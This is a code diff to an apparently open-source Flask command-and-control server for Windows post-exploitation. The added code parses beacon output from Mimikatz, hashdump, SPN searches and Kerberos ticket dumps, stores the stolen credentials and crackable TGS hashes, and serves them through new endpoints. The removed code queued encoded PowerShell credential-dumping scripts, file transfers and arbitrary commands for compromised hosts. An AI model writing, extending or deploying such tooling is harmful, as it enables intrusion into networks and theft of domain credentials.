@@ -37,6 +37,7 @@ from configobj import ConfigObj
 from lib.global_data import *
 from lib.Utils import *
 from lib.EmpireHelpers import *
+from lib.Control import *
 
 # FLASK
 from flask import Flask
@@ -46,7 +47,8 @@ from flask import render_template
 from flask import escape
 from flask import make_response
 from werkzeug import secure_filename
-from flask.ext.cors import CORS
+#from flask.ext.cors import CORS # DEPRECTAED
+from flask_cors import CORS
 
 import logging
 log = logging.getLogger('werkzeug')
@@ -78,6 +80,8 @@ key = 'SECRET' # NOT IMPLEMENTED
 utimestamp = int(time.time())
 gdata.load_command = "ipconfig|%s" % utimestamp
 
+control = Control()
+
 # LOAD CONFIG
 with open('config/payload.json') as data:    
     payload = json.load(data)
@@ -96,6 +100,16 @@ with open('config/target.json') as data:
 try:
     with open('data/credentials.json') as data:    
         gdata.credentials = json.load(data)
+except: pass
+
+try:
+    with open('data/credentials_spn.json') as data:    
+        gdata.credentials_spn = json.load(data)
+except: pass
+
+try:
+    with open('data/credentials_ticket.json') as data:    
+        gdata.credentials_ticket = json.load(data)
 except: pass
 
 # START FLASK LISTENER
@@ -378,6 +392,7 @@ def beaconGetData(request):
                     f.write(chr(int(i)))
             content = "download: %s\n\n" % filename
         
+        # TAKE SCREENSHOT
         if last_command.startswith("screenshot"):
             timestamp = int(time.time())
             filename = "%s_%s" % (uuid, timestamp)
@@ -386,7 +401,8 @@ def beaconGetData(request):
                 f.write(data)
             content = "screenshot: %s.png \n\n" % filename
         
-        if last_command.startswith("mimikatz"):
+        # DUMP CREDS WITH MIMIKATZ
+        if last_command == ("mimikatz"):
             output = ""
             for item in parse_mimikatz(content):
                 v_type = item[0]
@@ -414,8 +430,9 @@ def beaconGetData(request):
             store_credentials()
             
             content = "mimikatz ;) \n\n"
-            content += output
+            content += output + "\n"
         
+        # DUMP HASHES
         if last_command.startswith("hashdump"):
             data = content.split("\n")
             
@@ -442,11 +459,67 @@ def beaconGetData(request):
                         "host": v_host,
                         "source": "hashdump"
                     }
-            
-            store_credentials()
-            
-            content = "hashdump ;) \n\n" + content
         
+        # SEARCH SPNs
+        if last_command.startswith("spn_search"):
+            data = content.split("\n")
+            output = ""
+            
+            for values in data:
+                if values != "":
+                    item = values.split("|")
+                    
+                    v_samaccountname = item[0]
+                    v_serviceprincipalname = item[1]
+                    v_host = gdata.target[uuid]["name"]
+                    
+                    h = hashlib.md5()
+                    h_data = "%s%s" % (v_samaccountname, v_serviceprincipalname)
+                    h.update(h_data)
+                    v_id = h.hexdigest()
+                    
+                    gdata.credentials_spn[v_id] = {
+                        "samaccountname": v_samaccountname,
+                        "serviceprincipalname": v_serviceprincipalname
+                    }
+                    
+                    output += "samaccountname: %s\n" % v_samaccountname
+                    output += "serviceprincipalname: %s\n" % v_serviceprincipalname
+                    output += "\n"
+                    
+            store_credentials_spn()
+            
+            content = "get_spn ;) \n\n" + output
+        
+        # DUMP KERBEROS TGT & TGS WITH MIMIKATZ
+        if last_command.startswith("kerberos_ticket_dump"):
+            data = mimikatz2kirbi(content).split("\n")
+            output = ""
+            
+            for values in data:
+                if values != "":
+                    
+                    v_servername = values.split(":")[0].replace("$krb5tgs$","")
+                    v_john = values
+                    v_host = gdata.target[uuid]["name"]
+                    
+                    h = hashlib.md5()
+                    h_data = "%s%s%s" % (v_servername, v_john, v_host)
+                    h.update(h_data)
+                    v_id = h.hexdigest()
+                    
+                    gdata.credentials_ticket[v_id] = {
+                        "servername": v_servername,
+                        "john": v_john,
+                        "host": v_host
+                    }
+                    
+                    output += "servername: %s\n" % v_servername
+                    
+            store_credentials_ticket()
+            
+            content = "kerberos_ticket_dump ;) \n\n" + output
+            
         now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         save_log_raw(uuid, "[+] received %s bytes \n[+] received output (%s): \n" % (data_size, str(now)))
         save_log_raw(uuid, content)
@@ -562,11 +635,17 @@ def bot_control_get():
     #debug_request(request)
     # VERIFY IF SOURCE IP IS ALLOWED
     if validate_source_ip(request): return get_profile_headers_denied()
+    
+
     try:
         print "%s%s[SET-TASK]%s" % (bcolors.RED, bcolors.BOLD, bcolors.ENDC)
     
         param = request.args.get('v')
         param_target = request.args.get('t')
+        if (param_target) == "":
+            print "ERROR: TARGET NOT SELECTED\n"
+            return Response(json.dumps("ERROR: TARGET NOT SELECTED"))
+        
         print "%sUUID:%s %s" % (bcolors.BOLD, bcolors.ENDC, param_target)
         print "%sCOMMAND:%s %s" % (bcolors.BOLD, bcolors.ENDC, param)
         print
@@ -574,108 +653,15 @@ def bot_control_get():
         
         save_log_raw(param_target, "[*] set command: %s \n" % param[:100])
         
-        # IMPORT A POWERSHELL MODULE ON THE TARGET
-        if param.startswith("powershell-import"):
-            # ENCODE SCRIPT
-            script_path = param.replace("powershell-import ","").strip()
-            #print script_path
-            #with open('ps/PowerUp.ps1') as f:
-            with open(script_path) as f:
-                encoded = base64.b64encode(f.read())
-    
-            utimestamp = int(time.time())
-            _exec = ("%s|%s|%s") % ("powershell-import", utimestamp, encoded)
-            gdata.target[param_target]["exec"] = _exec
-        
-        # DUMP HASHES FROM THE TARGET
-        elif param == "hashdump":
-            with open("modules/core/Get-PassHashes.ps1") as f:
-                encoded = base64.b64encode(f.read())
-            utimestamp = int(time.time())
-            _exec = ("%s|%s|%s") % ("powershell-runscript", utimestamp, encoded)
-            gdata.target[param_target]["exec"] = _exec
-        
-        elif param == "hashdump-x":
-            with open("ps/Get-PassHashes.ps1") as f:
-                encoded = base64.b64encode(f.read())
-            lines = encoded.split("\n")
-            encoded = ""
-            for line in lines:
-                encoded += line
-            utimestamp = int(time.time())
-            _exec = ("%s|%s") % ("powershell-encoded -e " + encoded, utimestamp)
-            gdata.target[param_target]["exec"] = _exec
-        
-        elif param == "mimikatz":
-            with open("modules/core/Invoke-Mimikatz.ps1") as f:
-                encoded = base64.b64encode(f.read())
-            utimestamp = int(time.time())
-            _exec = ("%s|%s|%s") % ("powershell-runscript", utimestamp, encoded)
-            gdata.target[param_target]["exec"] = _exec
-        
-        elif param == "check_services":
-            with open("modules/core/Invoke-CheckServices.ps1") as f:
-                encoded = base64.b64encode(f.read())
-            utimestamp = int(time.time())
-            _exec = ("%s|%s|%s") % ("powershell-runscript", utimestamp, encoded)
-            gdata.target[param_target]["exec"] = _exec
-        
-        elif param == "ps":
-            utimestamp = int(time.time())
-            #encoded = powershell_encoder("Get-Process | select processname,Id,@{l='Owner';e={$owners[$_.id.tostring()]}}")
-            encoded = powershell_encoder("gwmi win32_process |select Handle, Name, @{l='User name';e={$_.getowner().user}} | FT -Property * -AutoSize")
-            #print encoded
-            _exec = ("%s|%s") % ("powershell powershell -e " + encoded, utimestamp)
-            gdata.target[param_target]["exec"] = _exec
-        
-        # UPLOAD FILE TO THE TARGET
-        elif param.startswith("upload"):
-            data = param.split(" ")
-            upload_name = data[1].split("/")
-            filename = open(data[1], "rb")
-            out = ""
-            with filename:
-                byte = filename.read()
-                for b in byte:
-                    hexadecimal = binascii.hexlify(b)
-                    decimal = int(hexadecimal, 16)
-                    out += str(decimal) + " "
-            out = out.strip()
-            #print out
-            encoded = base64.b64encode(out)
-            utimestamp = int(time.time())
-            _exec = ("%s|%s|%s") % ("upload " + upload_name[-1], utimestamp, encoded)
-            gdata.target[param_target]["exec"] = _exec
-        
-        # DOWNLOAD FILE FROM THE TARGET
-        elif param.startswith("download"):
-            
-            utimestamp = int(time.time())
-            _exec = ("%s|%s") % (param, utimestamp)
-            gdata.target[param_target]["exec"] = _exec
-        
-        # SCREENSHOT FROM AGENT
-        elif param == "screenshot":
-            with open("modules/core/Get-Screenshot.ps1") as f:
-                encoded = base64.b64encode(f.read())
-            utimestamp = int(time.time())
-            _exec = ("%s|%s|%s") % ("powershell-runscript", utimestamp, encoded)
-            gdata.target[param_target]["exec"] = _exec
-        
-        # EXEC COMMAND ON THE TARGET
-        else:
-            #print "%sCOMMAND:%s %s" % (bcolors.BOLD, bcolors.ENDC, param)
-            #print
-            utimestamp = int(time.time())
-            _exec = ("%s|%s") % (param, utimestamp)
-            gdata.target[param_target]["exec"] = _exec
+        # SET CONTROL COMMAND
+        _exec = control.set_command(param, param_target)
             
         resp = Response(json.dumps(_exec))
         return resp
     except:
         print traceback.print_exc()
         return Response(json.dumps("ERROR_CONTROL"))
-        
+
 # TARGET DETAILS [JSON]
 @app.route('/target')
 def get_target():
@@ -1369,6 +1355,24 @@ def credentials_del():
     store_credentials()
     
     resp = Response("Ok")
+    return resp
+
+# LIST CREDENTIALS SPN
+@app.route('/credentials/spn')
+def list_credentials_spn():
+    # VERIFY IF SOURCE IP IS ALLOWED
+    if validate_source_ip(request): return get_profile_headers_denied()
+    
+    resp = Response(json.dumps(gdata.credentials_spn))
+    return resp
+
+# LIST CREDENTIALS KERBEROS TICKET
+@app.route('/credentials/ticket')
+def list_credentials_ticket():
+    # VERIFY IF SOURCE IP IS ALLOWED
+    if validate_source_ip(request): return get_profile_headers_denied()
+    
+    resp = Response(json.dumps(gdata.credentials_ticket))
     return resp
 
 # DEFAULT [GET]
